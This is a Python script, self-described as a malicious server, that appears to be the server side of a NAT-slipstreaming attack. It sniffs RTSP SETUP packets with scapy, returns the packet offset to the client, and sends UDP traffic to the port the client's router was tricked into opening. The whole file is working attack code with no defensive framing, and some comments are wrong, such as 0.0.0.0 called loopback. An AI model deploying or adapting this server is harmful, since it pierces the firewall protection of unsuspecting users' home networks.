#!/usr/bin/env python3

import re
import socket
import subprocess
import time
from scapy.all import *
import threading

HOST = '0.0.0.0'  # Standard loopback interface address (localhost)
PORT = 554       # Port to listen on (non-privileged ports are > 1023)

JSON_OK="""HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.5
Date: Tue, 02 Mar 2021 04:13:06 GMT
Connection: close
Content-Type: application/json;charset=utf-8
Access-Control-Allow-Origin: *
Content-Length: $CL

"""

JSON_BODY="""{"offset": $OFFSET, "body": "$BODY"}
"""

NOT_FOUND=b"""HTTP/1.0 404 File not found
Server: SimpleHTTP/0.6 Python/3.8.5
Date: Tue, 02 Mar 2021 04:13:06 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 469

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
    </body>
</html>
"""

SETUP_REPLY="""RTSP/1.0 200 OK
CSeq: 1
Server: gortsplib
Session: 12345678
Transport: rtp/avp/tcp;client_port={}-{};server_port=8000-8001
"""

offsets={}
condition = threading.Condition()

## Define our Custom Action function
def log_offsets(packet):
    try:
        if packet[TCP]:
            #print("#==>", str(packet[TCP].payload))
            if 'SETUP' in str(packet[TCP].payload):
                with condition:
                    offsets[packet[0][1].src] = str(packet[TCP].payload).index('SETUP', 0)-2
                    condition.notify()
    except:
        pass
    return ""

## Setup sniff, filtering for IP traffic
t = AsyncSniffer(filter="port 554", prn=log_offsets)
t.start()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(0)
    print("This is a malicious server running on a remote host at port 554")
    while True:
        print("running ...")
        conn, addr = s.accept()
        conn.settimeout(2.0)
        with conn:
            print('Connected by', addr)
            ip = addr[0]
            while True:
                print("Waiting for more data ...")
                data = b''
                try:
                    while b'SETUP' not in data:
                        _data = conn.recv(1024)
                        if not _data:
                            break
                        data += _data
                except socket.timeout:
                    pass
                print("waiting on sniffer ...")
                with condition:
                    condition.wait(timeout=5.0)
                if offsets[addr[0]] != 0:
                    print("Sent offset ", offsets[addr[0]])
                    body = JSON_BODY.replace("$OFFSET", str(offsets[addr[0]])).replace("$BODY","")
                    head = JSON_OK.replace("$CL", str(len(body)))
                    conn.sendall((head+body).encode('utf-8'))
                    break
                #print("#", data)
                search = re.search(b'client_port=([0-9]+)-([0-9]+)', data, re.IGNORECASE)
                if search:
                    port1 = search.group(1).decode('utf-8')
                    port2 = search.group(2).decode('utf-8')
                    print("ip port1 port2:", ip, port1, port2)

                    try:
                        #conn.sendall(SETUP_REPLY.format(port1, port2).encode('utf-8'))
                        usock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP SOCKET
                        usock.sendto("It works! [{}]".format(time.time()).encode('utf-8'), (ip, int(port1)))
                        print("sent packet to {}@{}".format(port1,ip))
                        body = JSON_BODY.replace("$OFFSET", "0").replace("$BODY", "OK")
                        head = JSON_OK.replace("$CL", str(len(body)))
                        conn.sendall((head+body).encode('utf-8'))
                    except subprocess.CalledProcessError:
                        conn.sendall(NOT_FOUND)
                else:
                    print("could not find pattern")
                    conn.sendall(NOT_FOUND)
                break